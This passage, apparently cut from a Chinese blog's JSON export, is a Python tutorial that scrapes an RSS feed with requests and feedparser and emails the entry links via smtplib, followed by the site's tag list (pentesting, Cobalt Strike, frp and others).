Syndication,简易信息聚合)是一种描述和同步网站内容的格式你可以认为是一种定制个性化推送信息的服务。它能够解决你漫无目的的浏览网页的问题。它不会过时，信息越是过剩，它的意义也越加彰显。网络中充斥着大量的信息垃圾，每天摄入了太多自己根本不关心的信息。让自己关注的信息主动来找自己，且这些信息都是用户自己所需要的，这就是RSS的意义。更多RSS详细信息http://www.rssboard.org/rss-profile feedparser是一个Python的Feed解析库，可以处理RSS ，CDF，Atom 。使用它我们可从任何 RSS 或 Atom 订阅源得到标题、链接和文章的条目了。 首先用requests爬取你需要的网页信息,再用codecs作编码转换 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36'} page = requests.get(url, headers=headers) # 获取网页 page.encoding = 'utf-8' page_content = page.text # 变为文本格式 f = codecs.open('new_rss.txt', 'w', 'utf-8') # 将刚才的文本写入new_rss.txt文件中去 f.write(page_content) f.close() feedparser库的核心就是parse()函数，将获取的网页信息解析为xml格式 rss = feedparser.parse('new_rss.txt') # 将文本文件用函数解析成一个字典 提取所需要的标题以及链接 msg = '' # 定义一个变量 for i in range(len(rss.entries)): tag_a = rss.entries[i]['link'] # 获取链接 tag_title = rss.entries[i]['title'] # 获取标题 tag_content = rss.entries[i]['content']#获取内容 msg = msg + \"\"\" &lt;p&gt;&lt;a href=\"%s\"&gt;%s&lt;/a&gt;&lt;/p&gt; \"\"\" % (tag_a, tag_title) # 文本中带入变量的方法 3.发送邮件python发送邮件需要用到python自带的两个模块，smtplib和email。 mail_msg = MIMEMultipart() # 创建一个实例 mail_msg['Subject'] = subject #邮件主题 mail_msg['From'] = fromaddr #发信人邮箱 mail_msg['To'] = ','.join(toaddrs) #收信人邮箱 mail_msg.attach(MIMEText(msg, 'html', 'utf-8')) # html格式 文本为plain try: s = smtplib.SMTP() # 实例化 s.connect(smtpaddr) # 连接smtp服务器 s.login(fromaddr, password) # 登录邮箱 s.sendmail(fromaddr, toaddrs, mail_msg.as_string()) # 发送邮件 s.quit() print(\"Successfully sent email\") except Exception as e: print(\"Error: unable to send email\") print(traceback.format_exc()) # 回溯错误问题所在 4.完整代码import requests import codecs import feedparser import smtplib import traceback from email.mime.text import MIMEText from email.mime.multipart import MIMEMultipart def sendmail(subject, msg, toaddrs, fromaddr, smtpaddr, password): \"\"\" @subject:邮件主题 @msg:邮件内容 @toaddrs:收信人的邮箱地址 @fromaddr:发信人的邮箱地址 @smtpaddr:smtp服务地址，可以在邮箱看，比如163邮箱为smtp.163.com @password:网站授权码 \"\"\" mail_msg = MIMEMultipart() # 创建一个实例 mail_msg['Subject'] = subject mail_msg['From'] = fromaddr mail_msg['To'] = ','.join(toaddrs) mail_msg.attach(MIMEText(msg, 'html', 'utf-8')) # html格式 文本为plain try: s = smtplib.SMTP() # 实例化 s.connect(smtpaddr) # 连接smtp服务器 s.login(fromaddr, password) # 登录邮箱 s.sendmail(fromaddr, toaddrs, mail_msg.as_string()) # 发送邮件 s.quit() print(\"Successfully sent email\") except Exception as e: print(\"Error: unable to send email\") print(traceback.format_exc()) # 回溯错误问题所在 def get_info(url): headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 ' 'Safari/537.36'} page = requests.get(url, headers=headers) # 获取网页 page.encoding = 'utf-8' page_content = page.text # 变为文本格式 f = codecs.open('new_rss.txt', 'w', 'utf-8') # 将刚才的文本写入TXT文件中去 f.write(page_content) f.close() rss = feedparser.parse('new_rss.txt') # 将文本文件用函数解析成一个字典 msg = '' # 定义一个变量 for i in range(len(rss.entries)): tag_a = rss.entries[i]['link'] # 获取链接 tag_title = rss.entries[i]['title'] # 获取标题 tag_content = rss.entries[i]['content']#获取内容 msg = msg + \"\"\" &lt;p&gt;&lt;a href=\"%s\"&gt;%s&lt;/a&gt;&lt;/p&gt; \"\"\" % (tag_a, tag_title) # 文本中带入变量的方法 return msg if __name__ == '__main__': fromaddr = \"xxxxxxxxxxx@163.com\" smtpaddr = \"smtp.163.com\" toaddrs = [\"xxxxxxxx@qq.com\",\"xxxxx@hotmail.com”] subject = \"获取的xxx信息\" password = \"xxxxxxx\" #这里需要登录163邮箱自己设置授权码 url = 'https://www.xxxxxx.com/rss/' # 要爬取的rss某网页 msg = get_info(url) print(msg) #爬取的内容（html格式） sendmail(subject, msg, toaddrs, fromaddr, smtpaddr, password) # 发送邮件 ！","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://k3vi-07.github.io/tags/python/"}],"author":"dummersoul"}],"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://k3vi-07.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"docker","slug":"docker","permalink":"https://k3vi-07.github.io/tags/docker/"},{"name":"攻防","slug":"攻防","permalink":"https://k3vi-07.github.io/tags/%E6%94%BB%E9%98%B2/"},{"name":"redis","slug":"redis","permalink":"https://k3vi-07.github.io/tags/redis/"},{"name":"信息收集","slug":"信息收集","permalink":"https://k3vi-07.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://k3vi-07.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"weblogic","slug":"weblogic","permalink":"https://k3vi-07.github.io/tags/weblogic/"},{"name":"frp","slug":"frp","permalink":"https://k3vi-07.github.io/tags/frp/"},{"name":"ew","slug":"ew","permalink":"https://k3vi-07.github.io/tags/ew/"},{"name":"reGeorg","slug":"regeorg","permalink":"https://k3vi-07.github.io/tags/regeorg/"},{"name":"漏洞","slug":"漏洞","permalink":"https://k3vi-07.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"cobaltstrike","slug":"cobaltstrike","permalink":"https://k3vi-07.github.io/tags/cobaltstrike/"},{"name":"elk","slug":"elk","permalink":"https://k3vi-07.github.io/tags/elk/"},{"name":"python","slug":"python","permalink":"https://k3vi-07.github.io/tags/python/"},{"name":"kali","slug":"kali","permalink":"https://k3vi-07.github.io/tags/kali/"},{"name":"工具","slug":"工具","permalink":"https://k3vi-07.github.io/tags/%E5%B7%A5%E5%85%B7/"},{"name":"等保测评","slug":"等保测评","permalink":"https://k3vi-07.github.io/tags/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84/"},{"name":"mysql","slug":"mysql","permalink":"https://k3vi-07.github.io/tags/mysql/"},{"name":"Ctf","slug":"ctf","permalink":"https://k3vi-07.github.io/tags/ctf/"},{"name":"wsl","slug":"wsl","permalink":"https://k3vi-07.github.io/tags/wsl/"},{"name":"poc","slug":"poc","permalink":"https://k3vi-07.github.io/tags/poc/"},{"name":"Vmware","slug":"vmware","permalink":"https://k3vi-07.github.io/tags/vmware/"},{"name":"树莓派","slug":"树莓派","permalink":"https://k3vi-07.github.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"},{"name":"Linux","slug":"linux","permalink":"https://k3vi-07.github.io/tags/linux/"},{"name":"网络基础","slug":"网络基础","permalink":"https://k3vi-07.github.io/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}]}